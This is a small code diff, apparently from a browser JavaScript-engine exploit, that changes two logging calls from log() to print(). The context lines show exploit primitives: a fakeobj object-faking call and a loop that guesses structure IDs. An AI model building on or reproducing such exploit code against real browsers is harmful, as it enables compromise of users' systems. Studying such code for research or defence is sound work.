@@ -572,7 +572,7 @@ var VM_PROT_EXECUTE = 0x4
     var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
     var maxtry = 0;
     if (hax instanceof Array) {
-            log('got fakeobj with real struct id');
+            print("got fakeobj with real struct id");
             //continue;
         } else {
             while (!(hax instanceof Array)) {
@@ -581,7 +581,7 @@ var VM_PROT_EXECUTE = 0x4
             maxtry++;
             if (maxtry == 100000)
             {
-              log("wow 10000 tries on getting valid structid failed!!!");
+              print("wow 10000 tries on getting valid structid failed!!!");
             }
             }
         }
